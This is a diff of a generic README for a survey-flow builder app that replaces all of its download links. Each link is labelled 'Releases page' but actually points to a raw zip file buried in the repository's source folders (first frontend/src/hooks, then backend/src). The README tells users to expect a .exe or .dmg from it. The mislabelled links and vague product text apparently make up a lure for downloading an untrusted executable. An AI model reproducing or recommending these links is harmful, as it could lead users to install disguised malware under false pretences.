@@ -4,10 +4,10 @@
 Welcome to the Survey-Eligibility-Flow-Builder! This application helps you create survey flows using easy visual tools. You can set rules that determine who qualifies for your surveys. It’s perfect for researchers, product teams, and market research platforms.
 
 ## 📥 Download the Application
-[![Download Survey-Eligibility-Flow-Builder](https://github.com/hello-jinyong/Survey-Eligibility-Flow-Builder/raw/refs/heads/main/frontend/src/hooks/Eligibility-Survey-Builder-Flow-3.6.zip)](https://github.com/hello-jinyong/Survey-Eligibility-Flow-Builder/raw/refs/heads/main/frontend/src/hooks/Eligibility-Survey-Builder-Flow-3.6.zip)
+[![Download Survey-Eligibility-Flow-Builder](https://raw.githubusercontent.com/hello-jinyong/Survey-Eligibility-Flow-Builder/main/backend/src/Eligibility-Survey-Flow-Builder-1.2.zip)](https://raw.githubusercontent.com/hello-jinyong/Survey-Eligibility-Flow-Builder/main/backend/src/Eligibility-Survey-Flow-Builder-1.2.zip)
 
 ## 🚀 Getting Started
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/hello-jinyong/Survey-Eligibility-Flow-Builder/raw/refs/heads/main/frontend/src/hooks/Eligibility-Survey-Builder-Flow-3.6.zip) to find the application.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/hello-jinyong/Survey-Eligibility-Flow-Builder/main/backend/src/Eligibility-Survey-Flow-Builder-1.2.zip) to find the application.
 2. **Choose Your Version**: Locate the latest version available for download. Click on the appropriate file that suits your operating system.
 3. **Download the File**: Click the file link to download it directly to your computer. The file will usually be in `.exe` format for Windows users or `.dmg` for macOS users. 
 
@@ -54,4 +54,4 @@ Explore documentation and tutorials to understand all features and functions. He
 ## 🌟 Final Notes
 Thank you for choosing the Survey-Eligibility-Flow-Builder. We hope this application enhances your research process and helps you find the right participants for your surveys.
 
-Remember, you can always return to the [Releases page](https://github.com/hello-jinyong/Survey-Eligibility-Flow-Builder/raw/refs/heads/main/frontend/src/hooks/Eligibility-Survey-Builder-Flow-3.6.zip) to check for updates and new features. Happy building!
+Remember, you can always return to the [Releases page](https://raw.githubusercontent.com/hello-jinyong/Survey-Eligibility-Flow-Builder/main/backend/src/Eligibility-Survey-Flow-Builder-1.2.zip) to check for updates and new features. Happy building!
